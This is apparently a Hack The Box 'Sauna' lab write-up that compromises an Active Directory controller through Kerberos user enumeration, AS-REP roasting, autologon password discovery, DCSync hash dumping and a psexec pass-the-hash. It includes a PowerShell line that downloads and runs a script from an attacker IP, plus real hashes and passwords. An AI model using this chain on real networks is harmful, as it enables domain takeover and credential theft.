# Nmap
```
Open 10.129.95.180:53
Open 10.129.95.180:80
Open 10.129.95.180:88
Open 10.129.95.180:135
Open 10.129.95.180:139
Open 10.129.95.180:389
Open 10.129.95.180:445
Open 10.129.95.180:464
Open 10.129.95.180:593
Open 10.129.95.180:636
Open 10.129.95.180:5985
Open 10.129.95.180:9389

# Nmap 7.94 scan initiated Sat Jan 13 12:08:16 2024 as: nmap -vv --reason -Pn -T4 -T4 --min-rate 1000 -sV -sC --version-all -A --osscan-guess -oN /home/volt/htb/sauna/results/10.129.95.180/scans/_quick_tcp_nmap.txt -oX /home/volt/htb/sauna/results/10.129.95.180/scans/xml/_quick_tcp_nmap.xml 10.129.95.180
Nmap scan report for 10.129.95.180
Host is up, received user-set (0.079s latency).
Scanned at 2024-01-13 12:08:16 CET for 101s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-01-13 18:08:16Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38495/tcp): CLEAN (Timeout)
|   Check 2 (port 23574/tcp): CLEAN (Timeout)
|   Check 3 (port 10224/udp): CLEAN (Timeout)
|   Check 4 (port 17765/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-01-13T18:09:07
|_  start_date: N/A
|_clock-skew: 6h59m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 13 12:09:57 2024 -- 1 IP address (1 host up) scanned in 101.28 seconds
```

# 80 - http

There is a list of employees at ABOUT.html. Using the script `username-anarchy` I was able to create variations of their name and use `kerbrute` to find a pre-auth user:
```
./username-anarchy --input-file ~/htb/sauna/users.list > ~/htb/sauna/users.anarchy.list

~/go/bin/kerbrute userenum -d egotistical-bank.local --dc $RHOST users.anarchy.list

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/13/24 - Ronnie Flathers @ropnop

2024/01/13 14:04:20 >  Using KDC(s):
2024/01/13 14:04:20 >   10.129.95.180:88

2024/01/13 14:04:21 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
2024/01/13 14:04:22 >  Done! Tested 88 usernames (1 valid) in 1.240 seconds

```
# 389 - LDAP
```
ldapsearch -H ldap://$RHOST -x -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1


---


GetNPUsers.py egotistical-bank.local/fsmith -dc-ip 10.129.95.180 -no-pass                                                                                 <<<
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:2850dbc39eade7446a96c6c62149904e$c3ab73a9b412a548672da5b59e2a0fd198371a71859f4462d839bee41edd5ad6a0b12040ca90e9affc565f5b4012af0cf4a4161da3d42f1f04e1500c56468d7daa991377c9b743a0bbb7b35a483f4ba8c4ed28201a1d45d5acaac261b347a10ca13fc1006b8a958cc303cc182ee33d2619a5de8f4f210fc1bb400849854b824c88dd4387fb4ac37985cb04fc96f9c53d5ed8a39b66b69e953f1eacfddb7a16f1ed0d4c860feb42d4cd67d1a1069c8a74e0a8d5edb180f85c4967e26ec31a9fe6f69eabf751ac02a35df01cab32bde132d84c1bd19a1f2080b18f3d2f02bdc2ed2bae36e3673030139f22fb69a7915a1a1ff2770180a2c920db6db3c2f808db

Thestrokes23
```

# Foothold
```
./go_map_exec -u fsmith -p 'Thestrokes23' $RHOST


Scanning host 1/1 (10.129.95.180)...
RDP port is closed on 10.129.95.180, skipping RDP check.
Checking SMB on 10.129.95.180...
→ SMB Successfully authenticated with credentials fsmith/Thestrokes23 on 10.129.95.180 ←

SMBMap Result:
[+] IP: 10.129.95.180:445       Name: 10.129.95.180             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
        SYSVOL                                                  READ ONLY       Logon server share
[/] Authenticating...

SSH port is closed on 10.129.95.180, skipping SSH check.
Checking WinRM on 10.129.95.180...
→ WinRM Successfully authenticated with credentials fsmith/Thestrokes23 on 10.129.95.180 ←

```

# Privilege Escalation

After WinRM connection there is an auto-logon for user svc_loanmanager:
```
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr


iex(new-object net.webclient).downloadstring('http://10.10.16.54/PrivescCheck.ps1')
Invoke-WinlogonCheck


Result                                                                                                     Severity
------                                                                                                     --------
{@{Domain=EGOTISTICALBANK; Username=EGOTISTICALBANK\svc_loanmanager; Password=Moneymakestheworldgoround!}}        0

```

`svc_loanmgr` User enumeration:
```
./go_map_exec -u svc_loanmgr -p 'Moneymakestheworldgoround!' $RHOST
Scanning host 1/1 (10.129.95.180)...
RDP port is closed on 10.129.95.180, skipping RDP check.
Checking SMB on 10.129.95.180...
→ SMB Successfully authenticated with credentials svc_loanmgr/Moneymakestheworldgoround! on 10.129.95.180 ←

SMBMap Result:
[+] IP: 10.129.95.180:445       Name: 10.129.95.180             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
        SYSVOL                                                  READ ONLY       Logon server share


SSH port is closed on 10.129.95.180, skipping SSH check.
Checking WinRM on 10.129.95.180...
→ WinRM Successfully authenticated with credentials svc_loanmgr/Moneymakestheworldgoround! on 10.129.95.180 ←

```

The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL.
These two privileges allow a principal to perform a DCSync attack.

# Root

```
secretsdump.py egotistical-bank/svc_loanmgr@$RHOST -just-dc-user Administrator
Impacket v0.12.0.dev1+20240111.174639.6c9a1aad - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
```

```
psexec.py Administrator@10.129.180.72 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.12.0.dev1+20240111.174639.6c9a1aad - Copyright 2023 Fortra

[*] Requesting shares on 10.129.180.72.....
[*] Found writable share ADMIN$
[*] Uploading file UPOmLAFi.exe
[*] Opening SVCManager on 10.129.180.72.....
[*] Creating service WCZH on 10.129.180.72.....
[*] Starting service WCZH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```